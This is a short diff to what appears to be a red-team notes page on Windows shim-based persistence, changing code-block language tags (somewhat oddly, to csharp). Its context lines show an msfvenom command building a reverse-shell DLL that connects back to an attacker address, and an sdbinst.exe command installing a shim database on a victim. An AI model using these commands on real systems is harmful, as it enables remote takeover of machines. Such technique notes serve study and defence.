@@ -12,7 +12,7 @@ Generating malicious payload stored as a 32-bit DLL:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
-```bash
+```csharp
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil32.dll
 ```
 {% endcode-tabs-item %}
@@ -30,7 +30,7 @@ Installing the shim fixes database we created earlier onto the victim machine us
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
-```text
+```csharp
 sdbinst.exe C:\experiments\mantvydas.sdb
 ```
 {% endcode-tabs-item %}
